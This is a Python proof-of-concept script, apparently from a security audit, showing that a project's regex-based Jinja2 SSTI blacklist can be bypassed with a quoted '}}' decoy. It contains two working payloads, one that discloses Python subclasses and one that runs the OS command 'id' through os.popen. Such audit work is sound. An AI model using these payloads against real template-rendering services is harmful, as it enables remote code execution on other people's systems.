#!/usr/bin/env python3
"""
PoC: build/web/app/ssti_blacklist.py's regex-based blacklist is a complete
bypass. A quoted-string decoy containing a literal '}}' makes the non-greedy
JINJA_EXPR_RE regex stop scanning before it ever sees the real payload, while
Jinja2's own lexer correctly parses the whole expression through to the true
closing '}}'.

Run from build/web/ with its venv active (or any Python + jinja2 available):
    build/web/.venv/bin/python3 poc/sast/exploits/ssti-blacklist-bypass.py

Findings write-up: findings/sast/ssti-blacklist-bypass.md
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "build" / "web"))

from app.ssti_blacklist import is_blocked  # noqa: E402
from app.ssti_render import render_report_template  # noqa: E402


def demo(label, payload):
    print(f"=== {label} ===")
    print("payload:", payload)
    blocked = is_blocked(payload)
    print("is_blocked() ->", blocked)
    if blocked:
        print("BLOCKED (bypass did not work for this payload)")
    else:
        try:
            result = render_report_template(payload, {})
            print("RENDERED:", result[:200] + ("..." if len(result) > 200 else ""))
        except Exception as e:  # noqa: BLE001
            print("runtime error:", type(e).__name__, e)
    print()


if __name__ == "__main__":
    demo(
        "class-list disclosure (no banned token in the scanned fragment)",
        '{{("}}"~"").__class__.__mro__[1].__subclasses__()}}',
    )
    demo(
        "arbitrary OS command execution (id)",
        '{{("}}"~"")~self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}',
    )
